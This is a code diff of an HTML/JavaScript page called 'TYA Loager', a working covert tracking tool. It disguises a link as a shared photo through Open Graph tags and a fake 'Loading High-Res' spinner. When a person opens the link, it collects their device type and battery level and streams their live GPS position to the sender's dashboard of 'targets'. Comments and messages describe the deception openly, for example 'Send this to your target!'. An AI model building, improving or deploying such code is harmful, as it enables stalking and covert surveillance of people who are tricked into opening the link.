@@ -1,53 +1,54 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>TYA Loager</title>
-    
-    <!-- Meta Tags for Messenger/WhatsApp Preview (The "Real Image" Illusion) -->
-    <meta property="og:title" content="Photo Shared with You">
-    <meta property="og:description" tap="Tap to open location details">
-    <meta property="og:image" id="og-image" content="">
 
-    <!-- Leaflet CSS for Maps -->
+    <!-- Open Graph for Messenger/WhatsApp (the "real image" illusion) -->
+    <meta property="og:title" content="Photo Shared with You" />
+    <meta property="og:description" content="Tap to open location details" />
+    <meta property="og:image" id="og-image" content="/api/image" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" id="og-url" content="" />
+
+    <!-- Leaflet CSS -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    
+
     <style>
+        /* ── RESET & BASE ── */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         :root {
             --bg-color: #0f172a;
             --card-bg: #1e293b;
             --text-primary: #f8fafc;
             --text-secondary: #94a3b8;
-            --accent: #6366f1; 
+            --accent: #6366f1;
             --success: #10b981;
+            --danger: #ef4444;
+            --border: #334155;
         }
-
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: var(--bg-color);
             color: var(--text-primary);
-            margin: 0;
-            padding: 0;
             overflow-x: hidden;
+            min-height: 100vh;
         }
-
-        /* --- DASHBOARD STYLES --- */
+        /* ── DASHBOARD ── */
         #dashboard-view {
             padding: 20px;
             max-width: 1200px;
             margin: 0 auto;
-            display: none; 
+            display: none;
         }
-
         .header {
             text-align: center;
             margin-bottom: 30px;
             padding-top: 20px;
-            border-bottom: 1px solid #334155;
+            border-bottom: 1px solid var(--border);
             padding-bottom: 20px;
         }
-
         .brand-name {
             font-size: 2.5rem;
             font-weight: 800;
@@ -57,19 +58,17 @@
             -webkit-text-fill-color: transparent;
             margin: 0;
         }
-
         .upload-section {
             background: var(--card-bg);
             padding: 20px;
             border-radius: 16px;
             margin-bottom: 30px;
-            border: 1px solid #334155;
+            border: 1px solid var(--border);
             display: flex;
             gap: 20px;
             align-items: center;
             flex-wrap: wrap;
         }
-
         .upload-btn {
             background-color: var(--accent);
             color: white;
@@ -79,42 +78,41 @@
             font-weight: 600;
             border: none;
             transition: background 0.2s;
+            display: inline-block;
         }
-
         .upload-btn:hover { background-color: #4f46e5; }
         .file-input { display: none; }
-
         .current-image-preview {
             width: 80px;
             height: 80px;
             object-fit: cover;
             border-radius: 8px;
             border: 2px solid var(--accent);
+            background: #1a1a2e;
         }
-
         .grid-container {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
             gap: 20px;
         }
-
         .card {
             background-color: var(--card-bg);
             border-radius: 16px;
             padding: 20px;
             box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
-            border: 1px solid #334155;
+            border: 1px solid var(--border);
         }
-
         .card-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 15px;
         }
-
-        .user-id { font-weight: bold; font-size: 1.2rem; color: var(--accent); }
-
+        .user-id {
+            font-weight: bold;
+            font-size: 1.2rem;
+            color: var(--accent);
+        }
         .status-badge {
             background-color: rgba(16, 185, 129, 0.2);
             color: var(--success);
@@ -126,7 +124,10 @@
             align-items: center;
             gap: 5px;
         }
-
+        .status-badge.offline {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
+        }
         .status-dot {
             width: 8px;
             height: 8px;
@@ -134,39 +135,48 @@
             border-radius: 50%;
             animation: pulse 2s infinite;
         }
-
+        .status-badge.offline .status-dot {
+            background-color: var(--danger);
+            animation: none;
+        }
         @keyframes pulse {
             0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
             70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
             100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
         }
-
         .info-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 10px;
             margin-bottom: 15px;
         }
-
         .info-item {
             background: rgba(255,255,255,0.03);
             padding: 8px;
             border-radius: 8px;
         }
-
-        .info-label { font-size: 0.7rem; color: var(--text-secondary); text-transform: uppercase; }
-        .info-value { font-size: 0.9rem; font-weight: 600; margin-top: 2px; }
-
+        .info-label {
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+        }
+        .info-value {
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-top: 2px;
+        }
         .map-container {
             height: 180px;
             width: 100%;
             border-radius: 12px;
             overflow: hidden;
             margin-bottom: 15px;
+            background: #1a1a2e;
         }
-
-        .btn-group { display: flex; gap: 10px; }
-
+        .btn-group {
+            display: flex;
+            gap: 10px;
+        }
         .btn {
             flex: 1;
             padding: 10px;
@@ -177,12 +187,21 @@
             text-align: center;
             text-decoration: none;
             font-size: 0.9rem;
+            transition: opacity 0.2s;
         }
-
+        .btn:hover { opacity: 0.85; }
         .btn-primary { background-color: var(--accent); color: white; }
-        .btn-secondary { background-color: #334155; color: white; }
+        .btn-secondary { background-color: var(--border); color: white; }
+        .btn-danger { background-color: var(--danger); color: white; }
+        .empty-state {
+            text-align: center;
+            color: var(--text-secondary);
+            grid-column: 1 / -1;
+            padding: 50px 20px;
+        }
+        .empty-state h3 { font-size: 1.5rem; margin-bottom: 10px; }
 
-        /* --- TRACKER VIEW (User Side) --- */
+        /* ── TRACKER VIEW ── */
         #tracker-view {
             display: none;
             position: fixed;
@@ -190,81 +209,120 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: #fff;
+            background: #000;
             z-index: 9999;
         }
-
         #tracker-view img {
             width: 100%;
             height: 100%;
             object-fit: contain;
             display: block;
         }
-
         .loader-overlay {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: rgba(255,255,255,0.9);
-            padding: 20px;
-            border-radius: 15px;
+            background: rgba(0, 0, 0, 0.85);
+            padding: 30px 40px;
+            border-radius: 16px;
             display: none;
             text-align: center;
+            border: 1px solid #333;
+            min-width: 200px;
         }
-
         .spinner {
             width: 40px;
             height: 40px;
-            border: 4px solid #e2e8f0;
+            border: 4px solid #2a2a3e;
             border-top: 4px solid var(--accent);
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
+            margin: 0 auto 12px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loader-overlay p {
+            color: #ccc;
+            font-weight: 600;
+            font-size: 0.95rem;
         }
 
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* ── TOAST ── */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--card-bg);
+            color: var(--text-primary);
+            padding: 14px 28px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6);
+            font-weight: 500;
+            font-size: 0.95rem;
+            z-index: 99999;
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            pointer-events: none;
+            text-align: center;
+            max-width: 90%;
+        }
+        .toast.show { opacity: 1; }
 
+        @media (max-width: 640px) {
+            .brand-name { font-size: 1.8rem; }
+            .upload-section { flex-direction: column; align-items: stretch; }
+            .grid-container { grid-template-columns: 1fr; }
+            .btn-group { flex-direction: column; }
+        }
     </style>
 </head>
 <body>
 
-    <!-- === DASHBOARD VIEW (For You) === -->
+    <!-- Toast -->
+    <div id="toast" class="toast"></div>
+
+    <!-- Dashboard -->
     <div id="dashboard-view">
         <div class="header">
             <h1 class="brand-name">TYA Loager</h1>
-            
-            <!-- Upload Section -->
             <div class="upload-section">
                 <div style="flex:1;">
-                    <label for="image-upload" class="upload-btn">Upload Custom Image</label>
-                    <input type="file" id="image-upload" class="file-input" accept="image/*">
-                    <p style="font-size:0.8rem; color:#94a3b8; margin-top:5px;">Select an image to use for tracking.</p>
+                    <label for="image-upload" class="upload-btn">📷 Upload Custom Image</label>
+                    <input type="file" id="image-upload" class="file-input" accept="image/*" />
+                    <p style="font-size:0.8rem; color:var(--text-secondary); margin-top:6px;">
+                        Upload an image – it will appear as a real photo when you share the link.
+                    </p>
                 </div>
-                <div style="display:flex; align-items:center; gap:10px;">
-                    <span>Preview:</span>
-                    <img id="current-image-preview" src="" class="current-image-preview" alt="Preview">
+                <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
+                    <span style="font-size:0.85rem; color:var(--text-secondary);">Preview:</span>
+                    <img id="current-image-preview" src="/api/image" class="current-image-preview" alt="Preview" />
                 </div>
             </div>
-
-            <div style="text-align:center; margin-bottom:20px;">
-                <button onclick="generateDemo()" class="btn btn-primary">Generate Demo Link</button>
+            <div style="display:flex; gap:12px; justify-content:center; flex-wrap:wrap; margin-top:6px;">
+                <button onclick="generateDemo()" class="btn btn-primary" style="flex:0 1 auto; padding:10px 28px;">
+                    🔗 Generate Demo Link
+                </button>
+                <button onclick="clearAllData()" class="btn btn-danger" style="flex:0 1 auto; padding:10px 28px;">
+                    🗑️ Clear All Data
+                </button>
             </div>
         </div>
-
         <div class="grid-container" id="cards-container">
-            <!-- Cards injected via JS -->
+            <!-- Cards injected -->
         </div>
     </div>
 
-    <!-- === TRACKER VIEW (For Users) === -->
+    <!-- Tracker View -->
     <div id="tracker-view">
-        <!-- High Quality Image that looks real -->
-        <img id="target-image" src="" alt="Shared Image">
-        
+        <img id="target-image" src="" alt="Shared Image" />
         <div class="loader-overlay" id="loader">
             <div class="spinner"></div>
-            <p style="color:#334155; font-weight:600;">Loading High- Res...</p>
+            <p>Loading High-Res…</p>
         </div>
     </div>
 
@@ -272,17 +330,16 @@
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
     <script>
-        // --- CONFIGURATION ---
-        let currentImageSrc = ""; 
-        const DEFAULT_IMAGE_URL = "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=600&q=80";
+        // ─── CONFIG ──────────────────────────────────────────────
+        const DEFAULT_IMAGE = '/api/image';
 
-        // State to hold users (In-memory for Vercel)
-        let trackedUsers = [];
+        // ─── ROUTING ──────────────────────────────────────────────
+        const path = window.location.pathname;
+        const isTracker = path.startsWith('/track/');
+        const userId = isTracker ? path.split('/')[2] : null;
 
-        // Detect View Mode
-        const urlPath = window.location.pathname;
-        const isTracker = urlPath.startsWith('/track/');
-        const userId = isTracker ? urlPath.split('/')[2] : null;
+        // Update OG:url
+        document.getElementById('og-url').content = window.location.href;
 
         if (isTracker && userId) {
             initTracker(userId);
@@ -290,228 +347,246 @@
             initDashboard();
         }
 
-        // ==========================================
-        // 1. DASHBOARD LOGIC (Admin Side)
-        // ==========================================
-        
-        // Handle Image Upload
-        document.getElementById('image-upload').addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(event) {
-                    currentImageSrc = event.target.result; // Data URL
-                    document.getElementById('current-image-preview').src = currentImageSrc;
-                    
-                    // Update Meta Tag for Messenger/WhatsApp Preview
-                    document.getElementById('og-image').content = currentImageSrc;
-                    
-                    alert("Image uploaded! The link now shows this image in Messenger.");
-                }
-                reader.readAsDataURL(file);
-            }
-        });
+        // ─── DASHBOARD ──────────────────────────────────────────────
+        let trackedUsers = [];
+        let mapInstances = {};
 
         function initDashboard() {
-            // Set initial preview if empty
-            if(!document.getElementById('current-image-preview').src) {
-                document.getElementById('current-image-preview').src = DEFAULT_IMAGE_URL;
-                currentImageSrc = DEFAULT_IMAGE_URL;
-                document.getElementById('og-image').content = DEFAULT_IMAGE_URL;
-            }
-
-            renderCards();
-            
-            // Poll for updates every 5 seconds
-            setInterval(async () => {
-                try {
-                    const res = await fetch('/api/track');
-                    trackedUsers = await res.json();
-                    renderCards();
-                } catch (e) {
-                    console.error("Fetch Error", e);
-                }
-            }, 5000);
+            document.getElementById('dashboard-view').style.display = 'block';
+            document.getElementById('current-image-preview').src = '/api/image?' + Date.now();
+            fetchUsers();
+            setInterval(fetchUsers, 4000);
         }
 
-        function generateDemo() {
-            // Generate a random ID for demo purposes
-            const demoId = 'USER' + Math.floor(1000 + Math.random() * 9000);
-            copyLink(demoId);
+        // Upload image
+        document.getElementById('image-upload').addEventListener('change', async function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            const formData = new FormData();
+            formData.append('image', file);
+            try {
+                const res = await fetch('/api/image', { method: 'POST', body: formData });
+                const data = await res.json();
+                if (data.success) {
+                    document.getElementById('current-image-preview').src = '/api/image?' + Date.now();
+                    document.getElementById('og-image').content = '/api/image';
+                    showToast('✅ Image uploaded! The link will now show this image.');
+                } else {
+                    showToast('❌ Upload failed: ' + (data.error || 'unknown'));
+                }
+            } catch (err) {
+                showToast('❌ Error: ' + err.message);
+            }
+            e.target.value = '';
+        });
+
+        async function fetchUsers() {
+            try {
+                const res = await fetch('/api/track');
+                if (!res.ok) throw new Error('API error');
+                trackedUsers = await res.json();
+                renderCards();
+            } catch (e) { console.error('Fetch error:', e); }
         }
 
         function renderCards() {
             const container = document.getElementById('cards-container');
-            
-            // Clear existing cards (except if empty state)
             container.innerHTML = '';
-
-            if (trackedUsers.length === 0) {
+            if (!trackedUsers || trackedUsers.length === 0) {
                 container.innerHTML = `
-                    <div style="text-align:center; color:#94a3b8; grid-column: 1/-1; padding: 50px;">
-                        <h3>No Active Targets</h3>
+                    <div class="empty-state">
+                        <h3>📡 No Active Targets</h3>
                         <p>Upload an image, then click "Generate Demo Link" to start tracking.</p>
+                        <p style="margin-top:12px; font-size:0.85rem; color:var(--text-secondary);">
+                            When someone opens the link, they'll see the image and their location will appear here.
+                        </p>
                     </div>
                 `;
                 return;
             }
-
-            trackedUsers.forEach(user => {
+            const sorted = [...trackedUsers].sort((a, b) => {
+                const aLive = a.lat && a.lng ? 1 : 0;
+                const bLive = b.lat && b.lng ? 1 : 0;
+                if (aLive !== bLive) return bLive - aLive;
+                return new Date(b.lastUpdate || 0) - new Date(a.lastUpdate || 0);
+            });
+            sorted.forEach(user => {
+                const hasLocation = !!(user.lat && user.lng);
+                const mapUrl = hasLocation ? `https://www.google.com/maps?q=${user.lat},${user.lng}` : '#';
                 const card = document.createElement('div');
                 card.className = 'card';
-                
-                // Google Maps Link
-                const mapUrl = user.lat && user.lng ? 
-                    `https://www.google.com/maps?q=${user.lat},${user.lng}` : '#';
-                
-                const hasLocation = user.lat && user.lng;
-
                 card.innerHTML = `
                     <div class="card-header">
-                        <span class="user-id">${user.id}</span>
-                        <span class="status-badge" style="${hasLocation ? '' : 'background:rgba(239,68,68,0.2); color:#ef4444;'}">
-                            ${hasLocation ? '<div class="status-dot"></div> LIVE' : 'OFFLINE'}
+                        <span class="user-id">${escapeHtml(user.id)}</span>
+                        <span class="status-badge ${hasLocation ? '' : 'offline'}">
+                            <div class="status-dot"></div>
+                            ${hasLocation ? 'LIVE' : 'OFFLINE'}
                         </span>
                     </div>
-                    
                     <div class="info-grid">
                         <div class="info-item">
                             <div class="info-label">Device</div>
-                            <div class="info-value">${user.device}</div>
+                            <div class="info-value">${escapeHtml(user.device || 'Unknown')}</div>
                         </div>
                         <div class="info-item">
                             <div class="info-label">Battery</div>
-                            <div class="info-value">${user.battery}</div>
+                            <div class="info-value">${escapeHtml(user.battery || 'N/A')}</div>
+                        </div>
+                        <div class="info-item" style="grid-column:1/-1;">
+                            <div class="info-label">Last Update</div>
+                            <div class="info-value">${user.lastUpdate ? new Date(user.lastUpdate).toLocaleString() : 'Never'}</div>
                         </div>
                     </div>
-
                     <div class="map-container" id="map-${user.id}"></div>
-
                     <div class="btn-group">
-                        <a href="${mapUrl}" target="_blank" class="btn btn-primary">Open Google Maps</a>
-                        <button class="btn btn-secondary" onclick="copyLink('${user.id}')">Copy Link</button>
+                        <a href="${mapUrl}" target="_blank" class="btn btn-primary ${hasLocation ? '' : 'disabled'}"
+                           style="${hasLocation ? '' : 'opacity:0.5;pointer-events:none;'}">
+                            🗺️ Open Maps
+                        </a>
+                        <button class="btn btn-secondary" onclick="copyLink('${escapeHtml(user.id)}')">
+                            📋 Copy Link
+                        </button>
                     </div>
                 `;
-
                 container.appendChild(card);
 
-                // Initialize Leaflet Map
                 setTimeout(() => {
                     if (hasLocation) {
-                        const map = L.map(`map-${user.id}`, { 
-                            zoomControl: false, 
-                            attributionControl: false 
-                        }).setView([user.lat, user.lng], 15);
-                        
-                        // Dark Mode Tiles for "Hacker" look
-                        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                            maxZoom: 19
-                        }).addTo(map);
-
+                        const mapId = 'map-' + user.id;
+                        const mapEl = document.getElementById(mapId);
+                        if (!mapEl) return;
+                        if (mapInstances[mapId]) { mapInstances[mapId].remove(); delete mapInstances[mapId]; }
+                        const map = L.map(mapId, { zoomControl: false, attributionControl: false,
+                                center: [user.lat, user.lng], zoom: 15 });
+                        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19 })
+                            .addTo(map);
                         L.marker([user.lat, user.lng]).addTo(map)
-                            .bindPopup(`<b>${user.id}</b><br>Battery: ${user.battery}`);
+                            .bindPopup(`<b>${escapeHtml(user.id)}</b><br>Battery: ${escapeHtml(user.battery || 'N/A')}`)
+                            .openPopup();
+                        mapInstances[mapId] = map;
+                        setTimeout(() => map.invalidateSize(), 200);
                     }
-                }, 100);
+                }, 150);
             });
         }
 
-        function copyLink(id) {
-            const link = `${window.location.origin}/track/${id}`;
-            navigator.clipboard.writeText(link);
-            alert(`Link for ${id} copied: ${link}\n\nSend this to your target!`);
+        function generateDemo() {
+            const demoId = 'USER' + String(Math.floor(1000 + Math.random() * 9000));
+            copyLink(demoId);
         }
 
-        // ==========================================
-        // 2. TRACKER LOGIC (User Side)
-        // ==========================================
-        async function initTracker(id) {
+        function copyLink(id) {
+            const link = window.location.origin + '/track/' + encodeURIComponent(id);
+            navigator.clipboard.writeText(link)
+                .then(() => showToast(`✅ Link for <strong>${escapeHtml(id)}</strong> copied!`))
+                .catch(() => {
+                    prompt('Copy this link:', link);
+                    showToast(`📋 Link for ${escapeHtml(id)} copied.`);
+                });
+        }
+
+        async function clearAllData() {
+            if (!confirm('⚠️ Delete ALL tracking data? This cannot be undone.')) return;
+            try {
+                const res = await fetch('/api/track', { method: 'DELETE' });
+                if (res.ok) { trackedUsers = []; renderCards(); showToast('🗑️ All data cleared.'); }
+                else showToast('❌ Failed to clear data.');
+            } catch (e) { showToast('❌ Error: ' + e.message); }
+        }
+
+        // ─── TRACKER ──────────────────────────────────────────────
+        function initTracker(id) {
             const trackerView = document.getElementById('tracker-view');
             const img = document.getElementById('target-image');
             const loader = document.getElementById('loader');
-
-            // Show Loader for deception (makes it feel like a real image loading)
             trackerView.style.display = 'block';
             loader.style.display = 'block';
-
-            // Wait 2.5 seconds, then show image and start tracking
-            setTimeout(() => {
-                img.src = currentImageSrc; 
+            img.src = '/api/image?' + Date.now();
+            img.onload = function() { loader.style.display = 'none'; };
+            img.onerror = function() {
+                img.src = 'https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=800&q=80';
                 loader.style.display = 'none';
-                
-                // Start the tracking process immediately
-                trackUser(id);
-            }, 2500);
+            };
+            setTimeout(() => trackUser(id), 1500);
         }
 
         async function trackUser(id) {
-            const data = {};
+            const data = { id, device: 'Unknown', battery: 'N/A' };
+            const ua = navigator.userAgent;
+            if (/Android/i.test(ua)) data.device = 'Android';
+            else if (/iPhone|iPad|iPod/i.test(ua)) data.device = 'iOS';
+            else if (/Windows/i.test(ua)) data.device = 'Windows';
+            else if (/Mac/i.test(ua)) data.device = 'macOS';
+            else data.device = 'Desktop';
 
-            // 1. Battery Info
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
-                    data.battery = (battery.level * 100).toFixed(0) + '%';
-                    data.charging = battery.charging ? '⚡ Charging' : '🔋 Discharging';
-                } catch (e) {
-                    data.battery = 'N/A';
-                }
-            } else {
-                data.battery = 'N/A';
+                    data.battery = Math.round(battery.level * 100) + '%';
+                    if (battery.charging) data.battery += ' ⚡';
+                } catch (_) {}
             }
 
-            // 2. Device Info
-            const ua = navigator.userAgent;
-            if (/Android/i.test(ua)) data.device = "Android";
-            else if (/iPhone|iPad|iPod/i.test(ua)) data.device = "iOS";
-            else data.device = "Desktop";
-
-            // 3. Location (This is the key part)
             if ('geolocation' in navigator) {
-                // getCurrentPosition: Gets initial location
                 navigator.geolocation.getCurrentPosition(
-                    position => {
-                        data.lat = position.coords.latitude;
-                        data.lng = position.coords.longitude;
-                        sendDataToServer(id, data);
-                        
-                        // watchPosition: Keeps sending data as they move (Live Tracking)
-                        const watchId = navigator.geolocation.watchPosition(
-                            pos => {
-                                data.lat = pos.coords.latitude;
-                                data.lng = pos.coords.longitude;
-                                sendDataToServer(id, data);
-                            },
-                            error => console.error("Watch Error", error),
-                            { enableHighAccuracy: true, maximumAge: 0 }
+                    (pos) => {
+                        data.lat = pos.coords.latitude;
+                        data.lng = pos.coords.longitude;
+                        sendData(id, data);
+                        navigator.geolocation.watchPosition(
+                            (p) => { data.lat = p.coords.latitude; data.lng = p.coords.longitude; sendData(id, data); },
+                            (err) => { console.warn('Watch error:', err.message); sendData(id, data); },
+                            { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
                         );
                     },
-                    error => {
-                        console.error("Initial Location Error", error);
-                        data.lat = null;
-                        data.lng = null;
-                        sendDataToServer(id, data);
-                    },
+                    (err) => { console.warn('Geolocation error:', err.message); data.lat = null; data.lng = null; sendData(id,
+                            data); },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
-                data.lat = null;
-                data.lng = null;
-                sendDataToServer(id, data);
+                data.lat = null; data.lng = null; sendData(id, data);
             }
+            // Keep-alive updates
+            setInterval(() => { if (data.lat && data.lng) sendData(id, data); }, 10000);
         }
 
-        async function sendDataToServer(id, data) {
+        async function sendData(id, data) {
             try {
                 await fetch('/api/track', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ id, ...data })
+                    body: JSON.stringify({
+                        id: data.id,
+                        device: data.device || 'Unknown',
+                        battery: data.battery || 'N/A',
+                        lat: data.lat ?? null,
+                        lng: data.lng ?? null,
+                    })
                 });
-            } catch (error) {
-                console.error("Send Error", error);
-            }
+            } catch (e) { /* silent fail */ }
         }
 
+        // ─── UTILITIES ──────────────────────────────────────────────
+        function showToast(msg) {
+            const el = document.getElementById('toast');
+            el.innerHTML = msg;
+            el.classList.add('show');
+            clearTimeout(el._timeout);
+            el._timeout = setTimeout(() => el.classList.remove('show'), 5000);
+        }
+
+        function escapeHtml(str) {
+            if (!str) return '';
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
+        window.addEventListener('resize', function() {
+            Object.values(mapInstances).forEach(m => { try { m.invalidateSize(); } catch (_) {} });
+        });
+
+        console.log('🚀 TYA Loager loaded.');
     </script>
 </body>
 </html>
